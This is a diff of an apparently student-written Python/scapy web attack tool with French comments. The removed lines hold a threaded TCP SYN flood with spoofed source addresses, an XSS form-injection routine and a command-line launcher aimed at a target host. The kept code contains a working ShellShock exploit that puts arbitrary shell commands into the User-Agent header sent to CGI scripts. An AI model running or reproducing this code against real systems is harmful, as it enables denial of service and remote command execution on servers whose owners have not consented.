@@ -1,80 +1,15 @@
 #! /usr/bin/env python
 # -*- coding: utf-8 -*-
 
-# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.0.10 -j DRO
-
-
-## TODO:
-##  - vérifier que le code HTTP est 200 avant de poursuivre une attaque
-##  - Prendre en compte les redirection avec le header location
-##  - ATTENTION longueur payload XSS
-
-
 from scapy.all import *
-import threading
-import argparse
 import hashlib
-import urllib
-import random
 import Queue
-import copy
 import time
-import sys
-import os
 import re
-
-
-def parseTarget(target):
-    target = target.replace('http://', '')
-    target = target.replace('https://', '')
-    try : host, page = target.split('/', 1)
-    except :
-        host = target
-        page = ''
-    return host, page
-
+import os
 
 def getUniqueID():
     return hashlib.md5(str(time.time())).hexdigest()
-
-
-
-class DOS():
-    target = None
-    port = None
-    #init
-    def __init__(self, target, port = 80):
-        self.target = target
-        self.port = int(port)
-
-    def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True):
-        pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})
-
-        print "Starting flooding..."
-        for t in pool: t.start()      # Starting threads
-        for t in pool: t.join()       # Joining threads
-        print "Ending flooding."
-
-    def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
-        pool = []
-        for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
-            arg = copy.copy(arguments)
-            arg['start'] = port
-            arg['end'] = port + flood_port_step
-            if fake_ip: arg['fake_ip'] ="10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])
-
-            t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
-            pool.append(t)
-
-        return pool
-
-    def __tcp_syn_flood(self, fake_ip = None, start=40000, end=50000):
-        if fake_ip: ip = IP(dst=self.target, src=fake_ip)
-        else: ip = IP(dst=self.target)
-
-        syn = ip / TCP(dport=self.port, sport=(start, end), flags='S')
-        send(syn, verbose=0)
-        # print "Sent ", end - start, " with IP " + fake_ip if fake_ip else 'with local IP'
 
 class HTTP(object):
     """
@@ -88,6 +23,7 @@ class HTTP(object):
     RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
     FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
     INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
+    TXTAREA_REGEX = re.compile(r"<textarea(.*?)>(?:.*?)</textarea>", re.IGNORECASE | re.DOTALL)
     PARAM_REGEX = re.compile(r"(?P<name>\w*?)\=(?:\"|')(?P<value>.*?)(?:\"|')", re.IGNORECASE)
 
     # Defining TCP flags
@@ -139,7 +75,6 @@ class HTTP(object):
             Ferme la connexion passée en paramètre. Si init est à True, cela signifit que c'est la machine locale qui initie la fermeture de connexion.
         """
 
-
         if con.haslayer(Raw):
             close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + len(con[Raw].load), flags='FA')
         else:
@@ -176,7 +111,7 @@ class HTTP(object):
             for i in range(len(header)):
                  if ': ' not in header[i]: header[i] += ': '
 
-            header = {i.split(': ')[0]:i.split(': ')[1] for i in header[1:]}
+            header = {i.split(': ')[0].title():i.split(': ')[1] for i in header[1:]}
             self.get[page] = {'code':code, 'header':header, 'data_frag':{(ack, seq):data}, 'data':data, 'len': len(data)}
         else:
             print "ERREUR A TRAITER: HEADER N EST PAS ARRIVE EN PREMIER..."
@@ -205,7 +140,7 @@ class HTTP(object):
 
         # Close connection
         del(self.get[page]['data_frag']) # Useless after this point, so deleting
-        if self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
+        if 'Location' in self.get[page]['header']: #self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
             return self.request(req_funct, self.get[page]['header']['Location'], con, data)
         self.close(con, True)
 
@@ -240,6 +175,15 @@ class HTTP(object):
                 form['inputs'][name] = params
                 if 'required' in params: form['inputs'][name]['required'] = True
 
+            txtareas = HTTP.TXTAREA_REGEX.findall(content)
+            for txtarea in txtareas:
+                params = dict(HTTP.PARAM_REGEX.findall(txtarea))
+                name = params['name']
+
+                form['inputs'][params['name']] = params
+                form['inputs'][params['name']]['type'] = 'textarea'
+                if 'required' in params: form['inputs'][params['name']]['required'] = True
+
             self.get[page]['forms'].append(form)
         return self.get[page]['forms']
 
@@ -267,11 +211,14 @@ class HTTP(object):
 
     def formatHeader(self):
         """
-        Formatte de dictionnaire du header pour l'insérer dans la requête HTTP
+        Formate le dictionnaire du header pour l'insérer en texte dans la requête HTTP
         """
         return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'
 
     def __http_get(self, page, syn_ack, data=None):
+        """
+        Execute une requête GET et renvoie le résultat
+        """
 
         # Envoie de la requête GET
         getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
@@ -290,11 +237,13 @@ class HTTP(object):
         del self.request_header['Content-Type']
         del self.request_header['Content-Length']
 
-        print postStr
         return self.__tcp_request(page, syn_ack, postStr)
 
 
     def __tcp_request(self, page, syn_ack, html_request):
+        """
+            Execute une requete TCP en y ajoutant une requête HTML donnée en paramètre
+        """
         q = Queue.Queue()
 
         request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / html_request
@@ -323,162 +272,39 @@ class HTTP(object):
                 a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
                 for s, r in a: q.put(r) # Adding new fragments to queue
 
-            elif reply[TCP].flags & HTTP.RST : break
+            elif reply[TCP].flags & HTTP.RST : break # If receiving RST flag -> no more data will be sent
 
-        # for i in self.get[page]['data_frag']:
-        #     print i, ' : ', self.get[page]['data_frag'][i][-50:]
-        # print len(self.get[page]['data']), self.get[page]['header']['Content-Length']
         # Merging fragments
         self.mergeFragments(page)
         return reply
 
 
 class ShellShock(HTTP):
+    """
+        Cette classe permet de tester et d'exploiter la faille ShellShock. Cette
+        classe hérite de HTTP car cette attaque peut se résumer à une requête avec
+        un user agent particulier.
+        Cette faille n'est exploitable que via un script CGI.
+    """
+
     USER_AGENT = "() { :; };"#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
 
     def __init__(self, host, script_page, header = {}):
         super(ShellShock, self).__init__(host, header = header)
-        # self.host = HTTP(host)
         self.target = script_page
 
     def test(self):
-        md5 = getUniqueID() #hashlib.md5(self.host + '/' + self.target).hexdigest()
-        pattern = "SHELL_SHOCK_WORK_HERE_" + md5
+        uid = getUniqueID()
+        pattern = "SHELL_SHOCK_WORK_HERE_" + uid
         self.run("echo; echo '" + pattern + "'")
-        # pkts=sniff(filter="icmp", timeout=120,count=5)
 
         if pattern in self.get[self.target]['data']:
-            print "Faille exploitable sur " + self.host
+            print "Faille ShellShock exploitable sur " + self.host
             return True
         else:
-            print "Faille non exploitable sur " + self.host
+            print "Faille ShellShock non exploitable sur " + self.host
             return False
 
     def run(self, command):
         self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
         self.GET(self.target)
-
-class XSS():
-    PAYLOAD = "<a onmouseover=\"alert('" + getUniqueID() + "')\">test</a>"
-
-    def __init__(self, host, page, cookie = None):
-        print host, page
-        self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
-        self.page = page
-
-    def selectForms(self, forms):
-        selected_forms = []
-        for form in forms:
-            if self.fieldname in form['inputs']:
-                selected_forms.append(form)
-        return selected_forms
-
-    def printForms(self, forms):
-        for i in range(len(forms)):
-            print "Form ID: ", i
-            print "Method: ", forms[i]['method']
-            print "Action: ", forms[i]['action']
-            print "Inputs:"
-            for j in forms[i]['inputs']: print '\t- ', j, ': ', forms[i]['inputs'][j]['type'], forms[i]['inputs'][j]
-            print '\n\n'
-
-    def fillForm(self, form, fv={}):
-        data = {}
-        for name in form['inputs']:
-            inp = form['inputs'][name]
-            if not 'name' in inp: continue
-            if inp['type'] in ['reset', 'button', 'submit']: continue
-
-            # A améliorer (gestion de plus de types d'inputs)
-            if inp['type'] in ['text', 'password', 'url', 'search']:
-                if name in fv:
-                    data[name] = fv[name]
-                elif 'required' in inp and not (name in fv):
-                    data[name] = "xss testing"
-                else: data[name] = ""
-
-            elif inp['type'] == 'radio':
-                data[name] = inp['value']
-            else: data[name] = ""
-
-            data[self.fieldname] = XSS.PAYLOAD
-        return data
-
-    def run(self, fieldname, fieldvalue = {}):
-        self.target.GET(self.page)
-        self.fieldname = fieldname
-
-        sf = self.selectForms(self.target.getForms(self.page))
-
-        if len(sf) > 1:
-            self.printForms(sf)
-            id = -1
-            while id < 0 or id > len(sf):
-                id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(sf) - 1) + ') ? ')
-        elif len(sf) == 0:
-            print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
-            return 0
-        else: id = 0
-
-        form = sf[id]
-        formdata = urllib.urlencode(self.fillForm(form, fieldvalue))
-
-        if form['action'] == '': form_dest = self.page
-        else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))
-
-        if form['method'].lower() == 'post': self.target.POST(form_dest, data=formdata)
-        elif form['method'].lower() == 'get': self.target.GET(form_dest + '?' + formdata)
-
-        print XSS.PAYLOAD in self.target.get[form_dest]['data']
-
-if __name__ == "__main__":
-    conf.L3socket = L3RawSocket
-
-    parser = argparse.ArgumentParser(
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
-        description="Outil d'audit d'attaques sur application web et serveurs.")
-
-    parser.add_argument("target", help="Hote (ou url) à attaquer.", action='store')
-    parser.add_argument("-t", "--tcp-syn-flood", help='Fait un TCP SYN flood (DOS) sur la cible.', action='store_true')
-    parser.add_argument("-p", "--port", help='Port cible pour une attaque DOS.', action='store', type=int, default=80)
-    parser.add_argument("-s", "--shellshock", help='Teste la vulnérabilité à Shellshock (nécessite un cgi comme cible)', action='store_true')
-    parser.add_argument("-c", "--cookie", help='Cookie à utiliser', action='store')
-    parser.add_argument("-x", "--xss", help='Teste une attaque XSS sur l\'hote cible.', action='store_true')
-    parser.add_argument("-f", "--fieldname", help="Nom du champs à attaquer pour les attaques XSS ou les injections SQL.", action='store')
-    parser.add_argument("-v", "--fieldvalue", help="Valeur par défaut d'un autre champ (optionnel) format champ=valeur.", action='append', default=[])
-    args = parser.parse_args()
-    # print args
-
-    host, page = parseTarget(args.target)
-
-    if args.xss:
-        attack = XSS(host, page, args.cookie)
-        attack.run(args.fieldname, dict([i.split('=') for i in args.fieldvalue]))
-
-    if args.shellshock:
-        victim = ShellShock(host, page)
-        victim.test()
-        # if victim.test():
-        #     victim.run("echo; whoami")
-        #     print victim.get["cgi-bin/test.sh"]['data']
-
-    if args.tcp_syn_flood:
-        victim = DOS(host, args.port)
-        victim.tcp_syn_flood()
-
-
-    ######  Debug zone  #######
-    # print HTTP("192.168.0.21").GET('')
-    # html_rep = site.GET('groups/new.php')
-    # html_rep = site.GET('index.nginx-debian.html')
-    #
-    # code = html_rep['code']
-    #
-    # if code == 404:
-    #     print code, " - Not found"
-    # elif code == 301:
-    #     print "Moved at : " + html_rep['header']['Location']
-    #     close(reply)
-    # elif code == 200:
-    #     print html_rep['data']
-    #     print code
